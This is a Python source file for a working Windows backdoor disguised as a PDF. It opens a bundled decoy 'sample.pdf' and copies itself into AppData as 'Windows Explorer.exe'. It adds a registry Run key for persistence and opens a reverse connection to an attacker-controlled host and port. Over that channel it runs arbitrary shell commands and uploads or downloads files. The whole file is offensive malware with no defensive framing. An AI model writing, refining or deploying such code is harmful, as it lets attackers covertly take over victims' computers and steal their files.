import base64
import json
import os
import socket
import subprocess
import sys
import shutil

class Backdoor:
    def __init__(self, ip, port):
        self.become_presistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))  # Fixed typo: added parentheses around (ip, port)

    def become_presistent(self):
        # Define the file location in the AppData directory
        file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
        # Check if the file does not exist
        if not os.path.exists(file_location):
            # Copy the current executable to the file location
            shutil.copyfile(sys.executable, file_location)
            # Add the file to the Windows registry to run on startup
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + file_location + '"', shell=True)

    def reliable_send(self, data):
        # Encode data to JSON format and send it over the connection
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        # Receive JSON data from the connection and decode it
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        # Execute system command and return the output
        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)

    def change_working_directory_to(self, path):
        # Change the working directory
        os.chdir(path)
        return "[+] Changing working directory to " + path

    def read_file(self, path):
        # Read a file and encode its content in base64
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        # Decode base64 content and write it to a file
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful."

    def run(self):
        # Continuously receive commands from the attacker and execute them
        while True:
            command = self.reliable_receive()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1]).decode()
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command).decode()
            except Exception:
                command_result = "[-] Error during command execution."
            self.reliable_send(command_result)

# Specify the file name of the backdoor
file_name = sys.MEIPASS + "/sample.pdf"
# Open the specified file
subprocess.Popen(file_name, shell=True)

# Try to create a backdoor instance and run it
try:
    my_backdoor = Backdoor("127.0.0.1", 4444)
    my_backdoor.run()
except Exception:
    sys.exit()

